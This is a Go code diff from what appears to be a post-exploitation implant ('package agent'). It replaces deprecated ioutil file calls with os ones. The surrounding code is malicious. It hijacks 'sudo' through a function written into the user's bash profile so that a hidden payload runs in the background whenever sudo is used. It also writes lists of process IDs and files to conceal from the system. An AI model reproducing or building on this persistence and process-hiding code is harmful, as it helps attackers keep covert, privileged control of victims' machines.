@@ -6,7 +6,6 @@ package agent
 import (
 	"errors"
 	"fmt"
-	"io/ioutil"
 	"log"
 	"os"
 	"os/exec"
@@ -170,13 +169,13 @@ func profiles() (err error) {
 	}
 	sudoPayload := strings.Join(sudoLocs, "||")
 	loader += fmt.Sprintf("\nfunction sudo() { /usr/bin/sudo $@; (set +m;(%s 2>/dev/null)) }", sudoPayload)
-	err = ioutil.WriteFile(bashprofile, []byte(loader), 0644)
+	err = os.WriteFile(bashprofile, []byte(loader), 0644)
 	if err != nil {
 		return
 	}
 
 	// check if profiles are already written
-	data, err := ioutil.ReadFile(user.HomeDir + "/.bashrc")
+	data, err := os.ReadFile(user.HomeDir + "/.bashrc")
 	if err != nil {
 		log.Println(err)
 		return
@@ -242,7 +241,7 @@ func HidePIDs() (err error) {
 	pids = util.RemoveDupsFromArray(pids)
 	pid_list_str := strings.Join(util.IntArrayToStringArray(pids), "\n")
 
-	err = ioutil.WriteFile(Hidden_PIDs, []byte(pid_list_str), 0644)
+	err = os.WriteFile(Hidden_PIDs, []byte(pid_list_str), 0644)
 	if err != nil {
 		return
 	}
@@ -267,7 +266,7 @@ func patcher() (err error) {
 		util.FileBaseName(RuntimeConfig.AgentRoot),
 		util.FileBaseName(Hidden_Files),
 		util.FileBaseName(Hidden_PIDs))
-	err = ioutil.WriteFile(Hidden_Files, []byte(files), 0644)
+	err = os.WriteFile(Hidden_Files, []byte(files), 0644)
 	if err != nil {
 		log.Printf("Cannot create %s: %v", Hidden_Files, err)
 	}
